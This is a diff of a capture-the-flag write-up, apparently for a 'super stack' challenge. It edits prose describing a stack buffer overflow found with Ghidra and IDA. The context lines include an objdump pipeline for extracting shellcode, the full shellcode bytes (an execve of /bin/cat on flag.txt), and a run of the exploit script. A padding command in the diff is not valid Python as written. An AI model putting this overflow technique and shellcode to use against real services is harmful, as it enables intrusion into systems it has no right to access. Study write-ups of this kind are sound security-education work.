@@ -19,7 +19,7 @@ buf: 0xffb5773c
 aaaa
 returning NOW
 ```
-The binary was loaded into Ghidra and decompiled. As is usual with the framework the function we need to look at for what the code does is the `handle_connection()` function (I renamed the local variable to `buff`):
+The binary was loaded into Ghidra and decompiled. As is usual with the UCF framework the function we need to look at for is the `handle_connection()` function (I renamed the local variable to `buff`):
 ```c
 void handle_connection(void)
 
@@ -42,7 +42,7 @@ Let's start with an attempt at `ls` so we can see what's in the directory.
 
 I loaded the code into IDA and worked through the debugger to see how our stack was set up.
 
-I created a file containing 180 `A` characters to pass as input to the program so we can see this on the stack:
+I created a file containing 108 `A` characters to pass as input to the program so we can see this on the stack:
 ```
 python -c "printf('A'*108)" > inp.txt
 ```
@@ -54,7 +54,7 @@ We can also see the return address on the stack at 0xffd06abc:
 
 ![Stack with return address](ret_addr_on_stack.png)
 
-As the location of the buffer could change on each run, we'll need to enter the value manually for now, so we can trace through it in IDA to check we can start executing the buffer from the return call.
+As the location of the buffer could change on each run, we may need to enter the value manually for now and try and trace through it in IDA to check we can start executing the buffer from the return call.
 
 Unfortunately, entering binary hex values into a prompt cannot be done from the keyboard, so we can only test this with a script that can read the location of the buffer, and use that to fill in the value in the return address. This means we might as well go ahead and try things directly against the server.
 
@@ -255,7 +255,7 @@ I converted this to shellcode:
 > objdump -d ./cat_code|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe6\x50\x56\x53\x89\xe1\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
 ```
-I copied the output shellcode into the script and re-ran it:
+I copied the output shellcode into the script, adjusted the number of `A` characters added, and re-ran it:
 ```
 > ./hack_super_stack.sh 
 Found: buf: 0xffd6e68c
